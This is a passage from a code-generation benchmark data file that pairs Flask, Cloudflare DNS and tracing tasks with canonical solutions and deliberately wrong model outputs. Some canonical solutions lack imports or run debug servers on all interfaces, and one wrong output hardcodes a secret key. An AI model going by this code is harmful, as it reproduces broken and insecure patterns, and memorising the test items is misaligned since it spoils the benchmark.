    "Canonical_solution": "from flask import Flask, request, make_response\nfrom flask_cors import CORS\nfrom flask_restplus import Api, Resource\nimport json\nimport numpy as np\n\nclass NumpyEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, np.ndarray):\n            return obj.tolist()\n        if isinstance(obj, np.float32):\n            return str(obj)\n        return json.JSONEncoder.default(self, obj)\n\nclass InferenceServer:\n    def __init__(self, models_dirs=[\"saved_models\", \"base_models\"]):\n        self.app = Flask(__name__)\n        CORS(self.app)\n        self.api = Api(self.app, debug=True, validate=True, version=\"1.0\", title=\"FARM NLP APIs\")\n        self.app.config[\"JSON_SORT_KEYS\"] = True\n        self.app.config[\"RESTPLUS_VALIDATE\"] = True\n        \n        self.inferencers = {}\n        self._load_models(models_dirs)\n        self._setup_routes()\n\n    def _load_models(self, models_dirs):\n        model_paths = []\n        for model_dir in models_dirs:\n            path = Path(model_dir)\n            if path.is_dir():\n                models = [f for f in path.iterdir() if f.is_dir()]\n                model_paths.extend(models)\n\n        for idx, model_dir in enumerate(model_paths):\n            self.inferencers[idx + 1] = Inferencer.load(str(model_dir), num_processes=0)\n\n    def _setup_routes(self):\n        @self.api.route(\"/models\")\n        class ModelListEndpoint(Resource):\n            def get(self):\n                resp = []\n                for idx, model in self.inferencers.items():\n                    prediction_type = model.model.prediction_heads[0].model_type\n                    _res = {\n                        \"id\": idx,\n                        \"name\": model.name,\n                        \"prediction_type\": prediction_type,\n                        \"language\": model.language,\n                    }\n                    resp.append(_res)\n                return resp\n\n        @self.api.route(\"/models/<int:model_id>/inference\")\n        class InferenceEndpoint(Resource):\n            def post(self, model_id):\n                model = self.inferencers.get(model_id, None)\n                if not model:\n                    return \"Model not found\", 404\n\n                dicts = request.get_json().get(\"input\", None)\n                if not dicts:\n                    return {}\n                results = model.inference_from_dicts(dicts=dicts)\n                return results[0]\n\n        @self.api.representation(\"application/json\")\n        def resp_json(data, code, headers=None):\n            resp = make_response(json.dumps(data, cls=NumpyEncoder), code)\n            resp.headers.extend(headers or {})\n            return resp\n\n    def run(self, host=\"0.0.0.0\", port=5000):\n        self.app.run(host=host, port=port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nimport os\nimport json\nimport numpy as np\nfrom flask import Flask, Response\nfrom flask_restplus import Api, Resource\n\nclass NumpyEncoder(json.JSONEncoder):\n    def default(self, obj):\n        if isinstance(obj, np.ndarray):\n            return obj.tolist()\n        if isinstance(obj, np.generic):\n            return np.asscalar(obj)\n        return json.JSONEncoder.default(self, obj)\n\ndef resp_json(data, code=200, headers=None):\n    return Response(\n        json.dumps(data, cls=NumpyEncoder),\n        status=code,\n        mimetype='application/json',\n        headers=headers or {}\n    )\n\nclass InferenceServer:\n    class ModelListEndpoint(Resource):\n        def get(self):\n            model_list = [{\"id\": mid, **info} for mid, info in server.inferencers.items()]\n            return resp_json(model_list)\n\n    class InferenceEndpoint(Resource):\n        def post(self, model_id):\n            if model_id not in server.inferencers:\n                return resp_json({\"error\": \"Model not found\"}, 404)\n            data = self._parse_input()\n            result = server.inferencers[model_id].infer(data)\n            return resp_json(result)\n\n        def _parse_input(self):\n            return {\"input\": \"example_data\"}  # Placeholder for actual input parsing logic\n\n    def __init__(self, models_dirs=None):\n        self.app = Flask(__name__)\n        self.api = Api(self.app, version='1.0', title='Inference API')\n        self.inferencers = {}\n\n        self._load_models(models_dirs or [])\n        self._setup_routes()\n\n    def _load_models(self, models_dirs):\n        for dir_path in models_dirs:\n            if not os.path.isdir(dir_path):\n                continue\n            for model_id in os.listdir(dir_path):\n                model_path = os.path.join(dir_path, model_id)\n                if os.path.isdir(model_path):\n                    self.inferencers[int(model_id)] = {\n                        \"name\": f\"Model {model_id}\",\n                        \"type\": \"unknown\",\n                        \"description\": \"No description provided\"\n                    }\n\n    def _setup_routes(self):\n        ns = self.api.namespace('inference', description='Inference operations')\n        ns.add_resource(self.ModelListEndpoint, '/models')\n        ns.add_resource(self.InferenceEndpoint, '/infer/<int:model_id>')\n\n    def run(self, host='127.0.0.1', port=5000):\n        self.app.run(host=host, port=port)\n```"
  },
  {
    "Task_id": 136,
    "Instruction": "Task Description: Create a simple Flask web application that serves responses to HTTP requests on different routes.\n\nFunction Description: The application should have two main functions:\n1. A root route handler that returns a welcome message with Python version information\n2. A static file route handler that returns a simple text response\n\nInput:\n- For the root route (\"/\"): No input parameters required\n- For the static route (\"/static/test.txt\"): No input parameters required\n\nOutput:\n- For the root route: A string containing a welcome message with Python version information\n- For the static route: A string containing a static text response",
    "Canonical_solution": "from flask import Flask\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef hello():\n    version = \"{}.{}\".format(sys.version_info.major, sys.version_info.minor)\n    message = \"Hello World from Flask in a uWSGI Nginx Docker container with Python {} - testing\".format(\n        version\n    )\n    return message\n\n@app.route(\"/static/test.txt\")\ndef static_test():\n    return \"Static, from Flask\"\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True, port=80)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask\nimport sys\n\napp = Flask(__name__)\n\n@app.route('/')\ndef welcome():\n    python_version = f\"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}\"\n    return f\"Welcome! You are using Python version {python_version}\"\n\n@app.route('/static/test.txt')\ndef static_file():\n    return \"This is a static text response.\"\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```"
  },
  {
    "Task_id": 14,
    "Instruction": "Task Description: Create a Python class to interact with Cloudflare's API for managing DNS records, including retrieving zone IDs, listing DNS records, and updating DNS records.\n\nClass Description: The CloudflareAPI class provides methods to interact with Cloudflare's API v4 for DNS management. It handles authentication, request/response processing, and includes caching for DNS records to optimize performance.\n\nAttributes:\n- ID: [str] - Cloudflare account email used for authentication\n- TOKEN: [str] - Cloudflare API key or bearer token for authentication\n- PROXY: [str] - Optional proxy server address\n- TTL: [int] - Time-to-live value for DNS records\n- SITE: [str] - Cloudflare API endpoint (default: \"api.cloudflare.com\")\n- _records_cache: [dict] - Internal cache for storing DNS records to reduce API calls\n\nMethods:\n- _request: [method](method: str, action: str, param: dict=None, **params: dict) -> dict - Internal method to make HTTP requests to Cloudflare API. Handles connection, authentication, request formatting, and response processing.\n- get_zone_id: [method](domain: str) -> str - Retrieves the zone ID for a given domain by checking progressively broader subdomains.\n- get_records: [method](zoneid: str, **conditions: dict) -> dict - Retrieves DNS records matching given conditions from a specified zone, using cache when possible.\n- update_record: [method](domain: str, value: str, record_type: str=\"A\") -> dict - Updates or creates a DNS record for the specified domain with the given value and record type.",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom json import loads as jsondecode, dumps as jsonencode\nfrom logging import debug, info, warning\n\nclass CloudflareAPI:\n    def __init__(self, auth_email=None, api_key=None, proxy=None, ttl=None):\n        self.ID = auth_email\n        self.TOKEN = api_key\n        self.PROXY = proxy\n        self.TTL = ttl\n        self.SITE = \"api.cloudflare.com\"\n        self._records_cache = {}\n\n    def _request(self, method, action, param=None, **params):\n        if param:\n            params.update(param)\n\n        params = dict((k, params[k]) for k in params if params[k] is not None)\n        info(\"%s/%s : %s\", self.SITE, action, params)\n        \n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        if method in ['PUT', 'POST', 'PATCH']:\n            params['content'] = str(params.get('content'))\n            params = jsonencode(params)\n        else:\n            if params:\n                action += '?' + urlencode(params)\n            params = None\n\n        if not self.ID:\n            headers = {\"Content-type\": \"application/json\",\n                      \"Authorization\": \"Bearer \" + self.TOKEN}\n        else:\n            headers = {\"Content-type\": \"application/json\",\n                      \"X-Auth-Email\": self.ID, \"X-Auth-Key\": self.TOKEN}\n\n        conn.request(method, '/client/v4/zones' + action, params, headers)\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            warning('%s : error[%d]:%s', action, response.status, res)\n            raise Exception(res)\n        else:\n            data = jsondecode(res)\n            debug('%s : result:%s', action, data)\n            if not data:\n                raise Exception(\"Empty Response\")\n            elif data.get('success'):\n                return data.get('result', [{}])\n            else:\n                raise Exception(data.get('errors', [{}]))\n\n    def get_zone_id(self, domain):\n        zoneid = None\n        domain_slice = domain.split('.')\n        index = 2\n        while (not zoneid) and (index <= len(domain_slice)):\n            zones = self._request('GET', '', name='.'.join(domain_slice[-index:]))\n            zone = next((z for z in zones if domain.endswith(z.get('name'))), None)\n            zoneid = zone and zone['id']\n            index += 1\n        return zoneid\n\n    def get_records(self, zoneid, **conditions):\n        cache_key = zoneid + \"_\" + conditions.get('name', \"\") + \"_\" + conditions.get('type', \"\")\n        if cache_key not in self._records_cache:\n            self._records_cache[cache_key] = {}\n            data = self._request('GET', '/' + zoneid + '/dns_records', per_page=100, **conditions)\n            if data:\n                for record in data:\n                    self._records_cache[cache_key][record['id']] = {\n                        'id': record['id'],\n                        'type': record['type'],\n                        'name': record['name'],\n                        'content': record['content'],\n                        'proxied': record['proxied'],\n                        'ttl': record['ttl']\n                    }\n\n        records = {}\n        for (zid, record) in self._records_cache[cache_key].items():\n            for (k, value) in conditions.items():\n                if record.get(k) != value:\n                    break\n            else:\n                records[zid] = record\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        zoneid = self.get_zone_id(domain)\n        if not zoneid:\n            raise Exception(\"invalid domain: [ %s ] \" % domain)\n\n        records = self.get_records(zoneid, name=domain, type=record_type)\n        cache_key = zoneid + \"_\" + domain + \"_\" + record_type\n        result = {}\n\n        if records:\n            for (rid, record) in records.items():\n                if record['content'] != value:\n                    res = self._request('PUT', '/' + zoneid + '/dns_records/' + record['id'],\n                                      type=record_type, content=value, name=domain, \n                                      proxied=record['proxied'], ttl=self.TTL)\n                    if res:\n                        self._records_cache[cache_key][rid]['content'] = value\n                        result[rid] = res.get(\"name\")\n                    else:\n                        result[rid] = \"Update fail!\\n\" + str(res)\n                else:\n                    result[rid] = domain\n        else:\n            res = self._request('POST', '/' + zoneid + '/dns_records',\n                              type=record_type, name=domain, content=value, \n                              proxied=False, ttl=self.TTL)\n            if res:\n                self._records_cache[cache_key][res['id']] = res\n                result = res\n            else:\n                result = domain + \" created fail!\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\nimport time\n\n\nclass CloudflareAPI:\n    def __init__(self, ID, TOKEN, PROXY=None, TTL=300, SITE=\"api.cloudflare.com\"):\n        self.ID = ID\n        self.TOKEN = TOKEN\n        self.PROXY = PROXY\n        self.TTL = TTL\n        self.SITE = SITE\n        self._records_cache = {}\n\n    def _request(self, method, action, param=None, **params):\n        headers = {\n            \"X-Auth-Key\": self.TOKEN,\n            \"X-Auth-Email\": self.ID,\n            \"Content-Type\": \"application/json\"\n        }\n\n        proxies = {\"http\": self.PROXY, \"https\": self.PROXY} if self.PROXY else None\n\n        url = f\"https://{self.SITE}/client/v4/{action}\"\n        response = requests.request(method, url, headers=headers, json=param, params=params, proxies=proxies)\n        return response.json()\n\n    def get_zone_id(self, domain):\n        while True:\n            parts = domain.split('.')\n            if len(parts) <= 1:\n                raise Exception(f\"Zone for {domain} not found\")\n            zone_name = '.'.join(parts[1:])\n            data = self._request(\"GET\", f\"zones?name={zone_name}\")\n            if data.get(\"success\") and data[\"result\"]:\n                return data[\"result\"][0][\"id\"]\n            domain = zone_name\n\n    def get_records(self, zoneid, **conditions):\n        cache_key = (zoneid, tuple(sorted(conditions.items())))\n        if cache_key in self._records_cache:\n            cached_time, records = self._records_cache[cache_key]\n            if time.time() - cached_time < self.TTL:\n                return records\n\n        params = {}\n        for key, value in conditions.items():\n            params[key] = value\n\n        data = self._request(\"GET\", f\"zones/{zoneid}/dns_records\", params=params)\n        if data.get(\"success\"):\n            self._records_cache[cache_key] = (time.time(), data[\"result\"])\n            return data[\"result\"]\n\n        return []\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        zoneid = self.get_zone_id(domain)\n        subdomain = domain.split('.')[0]\n\n        # Get existing A record(s)\n        records = self.get_records(zoneid, type=record_type, name=subdomain)\n\n        if not records:\n            # No record exists, create a new one\n            payload = {\n                \"type\": record_type,\n                \"name\": domain,\n                \"content\": value,\n                \"ttl\": self.TTL,\n                \"proxied\": False\n            }\n            result = self._request(\"POST\", f\"zones/{zoneid}/dns_records\", param=payload)\n        else:\n            # Update the first matching record\n            record_id = records[0][\"id\"]\n            payload = {\n                \"type\": record_type,\n                \"name\": domain,\n                \"content\": value,\n                \"ttl\": self.TTL,\n                \"proxied\": records[0][\"proxied\"]\n            }\n            result = self._request(\"PUT\", f\"zones/{zoneid}/dns_records/{record_id}\", param=payload)\n\n        if result.get(\"success\"):\n            self._records_cache.clear()\n        return result\n```"
  },
  {
    "Task_id": 151,
    "Instruction": "Task Description: Create a Python class that implements a web server using Flask framework with authentication, search functionality, and WebSocket support. The server should handle HTTP requests, manage user sessions, and provide search capabilities against a data model.\n\nClass Description: MalcomWeb is a Process subclass that implements a web server with Flask. It handles HTTP requests, manages authentication, provides search functionality against a data model, and supports WebSocket connections. The server can be configured through a setup dictionary and runs in its own process.\n\nAttributes:\n\nlisten_port: [int] - The port number on which the server listens\nlisten_interface: [str] - The network interface on which the server listens\nsetup: [dict] - Configuration dictionary for server settings\nhttp_server: [WSGIServer] - Instance of the WSGI server\napp: [Flask] - Flask application instance\n\nMethods:\n\n__init__: [Name](auth, listen_port, listen_interface, setup) -> [None] - Initializes the web server process with authentication settings, port, interface, and configuration\nrun: [Name]() -> [None] - Starts the server process (inherited from Process)\nstop_server: [Name]() -> [None] - Stops the server (currently just a placeholder)\nstart_server: [Name]() -> [None] - Configures and starts the Flask application with routes and WebSocket support\nindex: [Name]() -> [Response] - Route handler for the root URL (requires login)\nsearch: [Name](term=\"\") -> [Response] - Route handler for search functionality (requires login), processes both GET and POST requests",
    "Canonical_solution": "from flask import Flask, request, render_template, redirect, url_for, make_response\nfrom gevent.pywsgi import WSGIServer\nfrom geventwebsocket.handler import WebSocketHandler\nfrom multiprocessing import Process\n\nclass MalcomWeb(Process):\n    def __init__(self, auth, listen_port, listen_interface, setup):\n        super(MalcomWeb, self).__init__()\n        self.setup = setup\n        self.listen_port = setup['LISTEN_PORT']\n        self.listen_interface = setup['LISTEN_INTERFACE']\n        self.http_server = None\n        self.app = Flask(__name__)\n        self.app.secret_key = os.urandom(24)\n        self.app.debug = True\n\n    def run(self):\n        self.start_server()\n\n    def stop_server(self):\n        pass\n\n    def start_server(self):\n        if not self.setup['AUTH']:\n            self.app.config['LOGIN_DISABLED'] = True\n\n        self.app.config['MODEL'] = ModelClass(self.setup)\n        self.app.config['USER_MANAGER'] = UserManagerClass(self.setup)\n\n        lm.init_app(self.app)\n        lm.login_view = 'login'\n        lm.session_protection = 'strong'\n        lm.anonymous_user = self.app.config['USER_MANAGER'].get_default_user\n\n        for key in self.setup:\n            self.app.config[key] = self.setup[key]\n        self.app.config['UPLOAD_DIR'] = \"\"\n\n        self.app.config['MESSENGER'] = WebMessenger()\n\n        @self.app.route('/')\n        @login_required\n        def index():\n            return redirect(url_for('search'))\n\n        @self.app.route('/search/', methods=['GET', 'POST'])\n        @login_required\n        def search(term=\"\"):\n            if request.method == 'POST':\n                field = 'value'\n                query = [{field: r.strip()} for r in request.form['bulk-text'].split('\\r\\n') if r.strip() != '']\n                result_set = self.app.config['MODEL'].find({'$or': query})\n            else:\n                query = request.args.get('query', False)\n                if query:\n                    query = query.strip()\n                field = request.args.get('field', 'value').strip()\n                if not bool(request.args.get('strict', False)):\n                    result_set = self.app.config['MODEL'].find({field: query})\n                else:\n                    result_set = self.app.config['MODEL'].find({field: re.compile(re.escape(query), re.IGNORECASE)})\n\n            if query == False:\n                return render_template('search.html', history=self.app.config['MODEL'].get_history())\n            elif query == \"\":\n                flash('Empty search query is empty.')\n                return redirect(url_for('search'))\n\n            base_elts = []\n            base_ids = []\n            evil_elts = {}\n\n            for e in result_set:\n                base_elts.append(e)\n                base_ids.append(e['_id'])\n                if 'evil' in e['tags']:\n                    evil_elts[e['_id']] = e\n\n            if len(base_elts) == 0 and request.method == 'GET':\n                if not bool(request.args.get('log', False)):\n                    flash('\"{}\" was not found. Use the checkbox above to add it to the database'.format(query))\n                    return render_template('search.html', term=query, history=self.app.config['MODEL'].get_history())\n                else:\n                    new = self.app.config['MODEL'].add_text([query], tags=['search'])\n                    if new:\n                        flash('\"{}\" was not found. It was added to the database (ID: {})'.format(query, new['_id']))\n                        self.app.config['MODEL'].add_to_history(query)\n                    else:\n                        flash('\"{}\" did not convert to a viable datatype'.format(query))\n                    return render_template('search.html', term=query, history=self.app.config['MODEL'].get_history())\n\n            if len(base_elts) == 0 and request.method == 'POST':\n                flash('Your query did not yield any results. Use the checkbox above to add it to the database')\n                return render_template('search.html', history=self.app.config['MODEL'].get_history())\n\n            return find_related(field, query, base_elts, base_ids, evil_elts)\n\n        self.http_server = WSGIServer((self.listen_interface, self.listen_port), self.app, handler_class=WebSocketHandler)\n        self.http_server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, request, session, redirect, url_for, render_template_string\nfrom gevent.pywsgi import WSGIServer\nfrom geventwebsocket.handler import WebSocketHandler\nfrom multiprocessing.process import Process\nimport json\n\nclass MalcomWeb(Process):\n    def __init__(self, auth, listen_port=5000, listen_interface='127.0.0.1', setup=None):\n        super().__init__()\n        self.listen_port = listen_port\n        self.listen_interface = listen_interface\n        self.setup = setup or {}\n        self.http_server = None\n        self.app = Flask(__name__)\n        self.auth = auth\n        self.app.secret_key = 'your_secret_key'\n\n    def run(self):\n        self.start_server()\n\n    def stop_server(self):\n        if self.http_server:\n            self.http_server.stop()\n\n    def start_server(self):\n        self.app.add_url_rule('/', 'index', self.index)\n        self.app.add_url_rule('/search', 'search', self.search, methods=['GET', 'POST'])\n\n        self.http_server = WSGIServer(\n            (self.listen_interface, self.listen_port),\n            self.app,\n            handler_class=WebSocketHandler\n        )\n        self.http_server.serve_forever()\n\n    def index(self):\n        if not self._check_auth():\n            return redirect(url_for('login'))\n        return \"Welcome to the Malcom Web Server!\"\n\n    def search(self, term=\"\"):\n        if not self._check_auth():\n            return redirect(url_for('login'))\n\n        if request.method == 'POST':\n            term = request.form.get('term', '')\n        # Implement your data model search logic here\n        results = f\"Search results for: {term}\"\n        return results\n\n    def _check_auth(self):\n        return 'user' in session and session['user'] == self.auth['username']\n```"
  },
  {
    "Task_id": 164,
    "Instruction": "Task Description: Create a Python function that sets up a real-time code tracing and visualization system using Flask to serve a web interface for monitoring execution patterns.\n\nFunction Description: The `trace` function establishes a web-based visualization tool that tracks and displays Python code execution in real-time. It creates a Flask web server that shows which lines of code are being executed most frequently, with features like heatmap visualization and stack trace inspection. The function uses Python's sys.settrace() mechanism to monitor execution and organizes the data for web display.\n\nInput:\n- files: [Optional callable] - A function to filter which files should be traced (default: None)\n- port: [int] - Port number for the web server (default: 9999)\n- host: [str] - Host address for the server (default: '127.0.0.1')\n- browser: [bool] - Whether to automatically open browser (default: False)\n- daemon: [bool] - Whether to run server as daemon thread (default: False)\n\nOutput:\n- None (The function runs indefinitely, serving the web interface and collecting trace data)\n\nThe function:\n1. Sets up tracing for the calling frame and specified files\n2. Creates a Flask web server with multiple routes for visualization\n3. Starts a background thread for the web server\n4. Configures sys.settrace() to collect execution data\n5. Optionally opens a browser window to display the visualization",
    "Canonical_solution": "import inspect\nimport logging\nimport sys\nimport threading\nimport webbrowser\nfrom collections import defaultdict, deque, Counter\nfrom functools import lru_cache\nfrom itertools import islice, takewhile\nfrom flask import Flask, render_template, jsonify, url_for, request\n\ndef trace(\n        files=None,\n        port=9999,\n        host='127.0.0.1',\n        browser=False,\n        daemon=False,\n):\n    calling_frame = inspect.currentframe().f_back\n    calling_file = calling_frame.f_code.co_filename\n\n    @lru_cache(maxsize=None)\n    def include_file(path):\n        try:\n            return path == calling_file or files(path)\n        except Exception:\n            return False\n\n    thread_ident = threading.get_ident()\n    queues = defaultdict(lambda: deque(maxlen=2 ** 10))\n    totals = defaultdict(Counter)\n\n    app = Flask(__name__)\n\n    host_is_local = host in [\"127.0.0.1\", \"localhost\"]\n    if host_is_local:\n        app.config[\"SERVER_NAME\"] = \"{host}:{port}\".format(host=host, port=port)\n\n    @app.route('/')\n    def index():\n        return render_template('index.html', files=sorted(queues.keys()))\n\n    @app.route('/file/')\n    def file_view():\n        return render_template(\"file.html\", **file_table_context())\n\n    def file_table_context():\n        filename = request.args['filename']\n        source = Source.for_filename(filename)\n        queue = queues[filename]\n\n        highlighted = highlight_ranges(source, frames_matching(filename))\n        highlighted_lines = list(enumerate(highlighted.splitlines()))\n        \n        counters = [\n            queue_counter(queue, 2 ** i)\n            for i in range(10 + 1)\n        ]\n\n        ratios = [\n            [\n                counter[i + 1] / min(2 ** c, len(queue) or 1)\n                * (c + 1) / 10\n                for c, counter in enumerate(counters)\n            ]\n            for i, _ in highlighted_lines\n        ]\n\n        max_ratio = max(map(max, ratios)) or 1\n\n        rows = [\n            (\n                i + 1,\n                totals[filename][i + 1] or '',\n                reversed([\n                    int(round(ratio / max_ratio * 100))\n                    for ratio in ratios[i]\n                ]),\n                line,\n            )\n            for i, line in highlighted_lines\n        ]\n\n        return dict(\n            rows=rows,\n            zip=zip,\n            lightnesses=[int((i + 1) * 100 / (10 + 1)) for i in range(10 + 1)],\n            filename=filename,\n            highlighted=highlighted,\n        )\n\n    @app.route('/table/')\n    def file_table_view():\n        return render_template('file_table.html', **file_table_context())\n\n    def current_frame():\n        return sys._current_frames()[thread_ident]\n\n    def frames_matching(filename):\n        frame = current_frame()\n        while frame:\n            if frame.f_code.co_filename == filename:\n                yield frame\n            frame = frame.f_back\n\n    @app.route('/stacktrace/')\n    def stacktrace():\n        def gen():\n            frame = current_frame()\n            while frame:\n                code = frame.f_code\n                filename = code.co_filename\n                name = Source.for_frame(frame).code_qualname(code)\n                yield (\n                    filename,\n                    frame.f_lineno,\n                    name,\n                    highlight_stack_frame(frame),\n                    include_file(filename)\n                )\n                frame = frame.f_back\n\n        return jsonify(list(takewhile(\n            lambda entry: not (\n                    'heartrate' in entry[0]\n                    and entry[2].endswith(trace_func.__name__)),\n            list(gen())[::-1]\n        )))\n\n    threading.Thread(\n        target=lambda: app.run(\n            debug=False,\n            host=host,\n            port=port,\n        ),\n        daemon=daemon,\n    ).start()\n\n    def trace_func(frame, event, _arg):\n        filename = frame.f_code.co_filename\n        if event == \"call\":\n            if include_file(filename):\n                return trace_func\n\n        elif event == \"line\":\n            lineno = frame.f_lineno\n            queues[filename].append(lineno)\n            totals[filename][lineno] += 1\n            Source.lazycache(frame)\n\n    calling_frame.f_trace = trace_func\n    sys.settrace(trace_func)\n    \n    if browser and host_is_local:\n        with app.app_context():\n            url = url_for(\n                'file_view',\n                filename=calling_file,\n            )\n        webbrowser.open_new_tab(url)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nimport sys\nimport threading\nimport webbrowser\nfrom flask import Flask, render_template_string\nimport inspect\n\napp = Flask(__name__)\ntrace_data = {}\n\ndef trace_filter(frame):\n    filename = frame.f_code.co_filename\n    return True\n\ndef trace_calls(frame, event, arg):\n    if event != 'line':\n        return\n    filename = frame.f_code.co_filename\n    lineno = frame.f_lineno\n    if not trace_filter(frame):\n        return\n    if filename not in trace_data:\n        trace_data[filename] = {}\n    if lineno not in trace_data[filename]:\n        trace_data[filename][lineno] = 0\n    trace_data[filename][lineno] += 1\n    return trace_calls\n\n@app.route('/')\ndef index():\n    lines = []\n    for file, data in trace_data.items():\n        for line_num, count in data.items():\n            lines.append({'file': file, 'line': line_num, 'count': count})\n    html = '''\n    <html>\n    <head><title>Code Trace Visualization</title></head>\n    <body>\n    <h1>Code Execution Heatmap</h1>\n    <table border=\"1\">\n    <tr><th>File</th><th>Line</th><th>Hit Count</th></tr>\n    {% for line in lines %}\n    <tr><td>{{ line.file }}</td><td>{{ line.line }}</td><td style=\"background-color:{{ 'lightgreen' if line.count > 0 else 'white' }}\">{{ line.count }}</td></tr>\n    {% endfor %}\n    </table>\n    </body>\n    </html>\n    '''\n    return render_template_string(html, lines=lines)\n\ndef run_server(host, port):\n    app.run(host=host, port=port)\n\ndef trace(files=None, port=9999, host='127.0.0.1', browser=False, daemon=False):\n    global trace_filter\n    if files is not None:\n        def custom_filter(frame):\n            return files(frame)\n        trace_filter = custom_filter\n\n    server_thread = threading.Thread(target=run_server, args=(host, port))\n    server_thread.daemon = daemon\n    server_thread.start()\n\n    sys.settrace(trace_calls)\n\n    if browser:\n        webbrowser.open(f'http://{host}:{port}')\n    while True:\n        pass\n```"
  },
  {
    "Task_id": 170,
    "Instruction": "Task Description: Create a simple web application using Flask that interacts with Redis to track and display the number of times the homepage has been accessed.\n\nFunction Description: The function `hello()` is a Flask route handler for the root URL ('/'). It increments a counter in Redis each time the route is accessed and returns a greeting message along with the current count of visits.\n\nInput: \n- None (The function handles HTTP GET requests to the root URL without requiring explicit input parameters)\n\nOutput: \n- A string response containing \"Hello World!\" followed by the current visit count in the format: \"Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {count} \u6b21\u3002\\n\" where {count} is the number of times the page has been accessed.",
    "Canonical_solution": "from flask import Flask\nfrom redis import Redis\n\napp = Flask(__name__)\nredis = Redis(host='redis', port=6379)\n\n@app.route('/')\ndef hello():\n    count = redis.incr('hits')\n    return 'Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {} \u6b21\u3002\\n'.format(count)\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask\nimport redis\n\napp = Flask(__name__)\nredis_client = redis.Redis(host='localhost', port=6379, db=0)\n\n@app.route('/')\ndef hello():\n    count = redis_client.incr('visit_count')\n    return f'Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {count} \u6b21\u3002\\n'\n```"
  },
  {
    "Task_id": 177,
    "Instruction": "Task Description: Create a RESTful API for a Todo application using Flask and Flask-RESTx that supports CRUD operations (Create, Read, Update, Delete) for todo items.\n\nClass Description: TodoAPI is a class that encapsulates the functionality of a Todo REST API. It initializes a Flask application, sets up API routes, defines data models, and manages todo items through a data access object (DAO).\n\nAttributes:\n- app: Flask - The Flask application instance\n- api: Api - The Flask-RESTx API instance for route registration\n- ns: Namespace - The namespace for organizing todo-related routes\n- todo: Model - The data model for todo items\n- todo_dao: TodoDAO - The data access object for managing todo items\n\nMethods:\n- __init__() -> None - Initializes the Flask app, API, namespace, data model, and sample data\n- _setup_routes() -> None - Defines all API routes and their handlers\n- run() -> None - Starts the Flask development server\n\nClass Description: TodoDAO is a helper class that manages the storage and retrieval of todo items in memory.\n\nAttributes:\n- counter: int - Auto-incrementing counter for todo IDs\n- todos: list - List storing all todo items\n\nMethods:\n- get(id: int) -> dict - Retrieves a todo item by ID or aborts with 404 if not found\n- create(data: dict) -> dict - Creates a new todo item with an auto-generated ID\n- update(id: int, data: dict) -> dict - Updates an existing todo item\n- delete(id: int) -> None - Deletes a todo item by ID",
    "Canonical_solution": "from flask import Flask\nfrom flask_restx import Api, Resource, fields\nfrom werkzeug.middleware.proxy_fix import ProxyFix\n\nclass TodoAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.app.wsgi_app = ProxyFix(self.app.wsgi_app)\n        self.api = Api(\n            self.app,\n            version=\"1.0\",\n            title=\"TodoMVC API\",\n            description=\"A simple TodoMVC API\",\n        )\n        self.ns = self.api.namespace(\"todos\", description=\"TODO operations\")\n        \n        self.todo = self.api.model(\n            \"Todo\",\n            {\n                \"id\": fields.Integer(readonly=True, description=\"The task unique identifier\"),\n                \"task\": fields.String(required=True, description=\"The task details\"),\n            },\n        )\n        \n        self.todo_dao = TodoDAO()\n        self.todo_dao.create({\"task\": \"Build an API\"})\n        self.todo_dao.create({\"task\": \"?????\"})\n        self.todo_dao.create({\"task\": \"profit!\"})\n        \n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.ns.route(\"/\")\n        class TodoList(Resource):\n            @self.ns.doc(\"list_todos\")\n            @self.ns.marshal_list_with(self.todo)\n            def get(self):\n                return self.todo_dao.todos\n\n            @self.ns.doc(\"create_todo\")\n            @self.ns.expect(self.todo)\n            @self.ns.marshal_with(self.todo, code=201)\n            def post(self):\n                return self.todo_dao.create(self.api.payload), 201\n\n        @self.ns.route(\"/<int:id>\")\n        @self.ns.response(404, \"Todo not found\")\n        @self.ns.param(\"id\", \"The task identifier\")\n        class Todo(Resource):\n            @self.ns.doc(\"get_todo\")\n            @self.ns.marshal_with(self.todo)\n            def get(self, id):\n                return self.todo_dao.get(id)\n\n            @self.ns.doc(\"delete_todo\")\n            @self.ns.response(204, \"Todo deleted\")\n            def delete(self, id):\n                self.todo_dao.delete(id)\n                return \"\", 204\n\n            @self.ns.expect(self.todo)\n            @self.ns.marshal_with(self.todo)\n            def put(self, id):\n                return self.todo_dao.update(id, self.api.payload)\n\n    def run(self):\n        self.app.run(debug=True)\n\nclass TodoDAO:\n    def __init__(self):\n        self.counter = 0\n        self.todos = []\n\n    def get(self, id):\n        for todo in self.todos:\n            if todo[\"id\"] == id:\n                return todo\n        self.api.abort(404, \"Todo {} doesn't exist\".format(id))\n\n    def create(self, data):\n        todo = data\n        todo[\"id\"] = self.counter = self.counter + 1\n        self.todos.append(todo)\n        return todo\n\n    def update(self, id, data):\n        todo = 